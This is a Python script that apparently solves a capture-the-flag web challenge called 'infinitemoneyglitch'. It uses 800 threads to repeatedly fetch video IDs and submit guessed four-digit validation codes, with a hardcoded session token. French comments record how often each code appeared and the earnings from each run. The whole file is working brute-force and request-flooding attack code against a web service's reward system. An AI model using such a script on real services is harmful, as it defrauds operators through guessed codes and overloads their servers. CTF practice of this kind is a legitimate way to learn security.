import random
import time
import requests
from bs4 import BeautifulSoup
import threading, keyboard

def get_video(token):
    url = "http://infinitemoneyglitch.chall.malicecyber.com/video"
    headers = {
        "Content-Type": "application/json",
        "Cookie": f"token={token};"
    }
    response = requests.get(url, headers=headers)
    add_time = time.time()
    soup = BeautifulSoup(response.text, 'html.parser')
    try :
        data_uuid = soup.select_one('[data-uuid]')
        return data_uuid['data-uuid'], add_time
    except :
        pass

def validate_video(token, code, uuid_video):
    url = "http://infinitemoneyglitch.chall.malicecyber.com/validate"
    headers = {
        "Content-Type": "application/json",
        "Cookie": f"token={token};"
    }

    data = {
        "code": code,
        "uuid": uuid_video
    }
    response = requests.post(url, headers=headers, json=data)
    return response.status_code, response.text

top_code_possibles = ["1072", "3223", "5537", "7886", "6226", "4015"]

def main(token):
    threads = []
    for _ in range(800):
        thread = threading.Thread(target=send_request, args=(token,))
        threads.append(thread)
        thread.start()
        
    for thread in threads:
        thread.join()

def send_request(token):
    while True:
        try:
            uuid, add_time = get_video(token)
            time.sleep(20 - (time.time() - add_time))
            code = random.choice(top_code_possibles)
            validate_video(token, code, uuid)
        except:
            pass

if __name__ == "__main__":
    url = "infinitemoneyglitch.chall.malicecyber.com"
    token = "4e5618e6-b0a3-4ca7-82fd-a0eb5a5a27fa"
    main(token)


'''
    Code '1072' - Nombre d'apparitions : 20
    Code '3223' - Nombre d'apparitions : 18
    Code '5537' - Nombre d'apparitions : 14
    Code '7886' - Nombre d'apparitions : 14
    Code '6226' - Nombre d'apparitions : 14
    Code '4015' - Nombre d'apparitions : 10
    Code '1624' - Nombre d'apparitions : 9
    Code '4521' - Nombre d'apparitions : 8
    Code '7562' - Nombre d'apparitions : 8
    Code '8606' - Nombre d'apparitions : 6
    Code '5376' - Nombre d'apparitions : 6
    Code '7700' - Nombre d'apparitions : 4
    Code '4403' - Nombre d'apparitions : 3
    Code '4075' - Nombre d'apparitions : 3
    Code '1041' - Nombre d'apparitions : 3
    Code '6152' - Nombre d'apparitions : 2
    Code '8318' - Nombre d'apparitions : 2
    Code '7514' - Nombre d'apparitions : 2
    Code '8471' - Nombre d'apparitions : 1

    147/10000 = 0.015% - 8.5e

    Code '3223' - Nombre d'apparitions : 7
    Code '6226' - Nombre d'apparitions : 5
    Code '5537' - Nombre d'apparitions : 5
    Code '7886' - Nombre d'apparitions : 5
    Code '1072' - Nombre d'apparitions : 4
    Code '4015' - Nombre d'apparitions : 3

    186/15000 = 0.012% 

    Code '3223' - Nombre d'apparitions : 7
    Code '6226' - Nombre d'apparitions : 5
    Code '5537' - Nombre d'apparitions : 5
    Code '7886' - Nombre d'apparitions : 5
    Code '1072' - Nombre d'apparitions : 4
    Code '4015' - Nombre d'apparitions : 3

    29/1000 = 0.030% - 5min - 1.6e


    Code '5537' - Nombre d'apparitions : 11
    Code '7886' - Nombre d'apparitions : 12
    Code '6226' - Nombre d'apparitions : 10
    Code '1072' - Nombre d'apparitions : 9
    Code '4015' - Nombre d'apparitions : 9
    Code '3223' - Nombre d'apparitions : 7

    Pour 13 minutes de run :
        800r/salve - 12.3e
        900r/salve - 11.5
        1000r/salve - 9.6e
        700r/salve - 8.4e
        500r/salve - 8.2e  
        1500r/salve -  7.2e
        2000r/salve - 33

    Objectif : pour 13 min : 16.7e
'''